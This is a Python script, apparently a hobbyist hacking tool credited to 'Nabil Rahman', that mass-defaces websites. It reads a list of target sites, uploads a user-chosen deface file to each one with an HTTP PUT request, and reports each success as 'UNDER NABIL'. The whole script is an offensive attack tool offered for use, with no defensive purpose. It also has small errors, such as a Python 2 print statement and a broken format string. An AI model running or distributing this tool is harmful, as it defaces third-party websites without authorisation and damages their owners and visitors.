#-*- coding: utf-8 -*-

try:
   import requests
   import os.path
   import sys
except ImportError:
   exit("install requests and try again ...")

banner = """
            ░█▄─░█ ─█▀▀█ ░█▀▀█ ▀█▀ ░█─── 
            ░█░█░█ ░█▄▄█ ░█▀▀▄ ░█─ ░█─── 
            ░█──▀█ ░█─░█ ░█▄▄█ ▄█▄ ░█▄▄█
                                
          █▀█ █▀▀ █▀▀ █ █▀▀ █ ▄▀█ █░░
          █▄█ █▀░ █▀░ █ █▄▄ █ █▀█ █▄▄
                
                            
                                                                                                     
\033[1;91m=======================================
\033[1;96mAuthor  \033[1;93m: \033[1;92mNABIL RAHMAN
\033[1;96mInstagram \033[1;93m: \033[1;92m💀UNKNOWN💀
\033[1;96mFacebook  \033[1;93m: \033[1;92mNabil Rahman
\033[1;96mPronhub \033[1;93m: \033[1;92mNai
\033[1;91m======================================="""
""
os.system("clear")
print  """
       

\033[1;97m  _       __________    __________  __  _________\033[0m
\033[1;97m | |     / / ____/ /   / ____/ __ \/  |/  / ____/\033[0m
\033[1;97m | | /| / / __/ / /   / /   / / / / /|_/ / __/   \033[0m
\033[1;97m | |/ |/ / /___/ /___/ /___/ /_/ / /  / / /___   \033[0m
\033[1;97m |__/|__/_____/_____/\____/\____/_/  /_/_____/\033[3;97mv1.1\033[0m
  \033[1;91m██ 20% *___*
   \033[1;92m███ 40% *___*
    \033[1;93m████ 60% *___* 
      \033[1;97m█████ 80% *___*
       \033[1;96m██████ MADE BY NABIL *___*
"""""
b = '\033[31m'
h = '\033[32m'
m = '\033[00m'

def x(tetew):
   ipt = ''
   if sys.version_info.major > 2:
      ipt = input(tetew)
   else:
      ipt = raw_input(tetew)
   
   return str(ipt)

def aox(script,target_file="target.txt"):
   op = open(script,"r").read()
   with open(target_file, "r") as target:
      target = target.readlines()
      s = requests.Session()
      print("uploading file to %d website"%(len(target)))
      for web in target:
         try:
            site = web.strip()
            if site.startswith("http://") is False:
               site = "http://" + site
            req = s.put(site+"/"+script,data=op)
            if req.status_code < 200 or req.status_code >= 250:
               print(m+"["+b+" FAILED!"+m+" ] %s/%s"%(site,script))
            else:
               print(m+"["+h+" UNDER NABIL"+m+" ] %s/%s"%(site,script))

         except requests.exceptions.RequestException:
            continue
         except KeyboardInterrupt:
            print; exit()

def main(__bn__):
   print(__bn__)
   while True:
      try:
         a = x("NABIL SAY ENTER UR DEFACE: ")
         if not os.path.isfile(a):
            print("VUL FILE"%(a))
            continue
         else:
            break
      except KeyboardInterrupt:
         print; exit()

   aox(a)

if __name__ == "__main__":
    main(banner)
